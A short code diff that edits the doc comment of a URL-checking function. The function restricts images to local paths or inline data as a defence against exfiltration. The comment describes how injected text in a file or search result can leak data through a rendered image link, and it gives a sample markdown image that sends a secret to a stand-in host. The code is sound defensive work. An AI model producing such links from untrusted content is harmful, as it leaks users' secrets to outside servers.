@@ -157,7 +157,7 @@ const HERE = "https://app.invalid";
 /**
  * Whether an image's address stays on this app: a path here, or inline image
  * data. Anything else would make the reader's browser call another server as
- * soon as the text is shown (issue #291), which is how text injected into a
+ * soon as the text is shown, which is how text injected into a
  * file or a search result gets data out: `![](https://elsewhere/?q=<secret>)`.
  * The URL parser decides, so `//host`, `/\\host` and odd schemes don't slip by.
  */
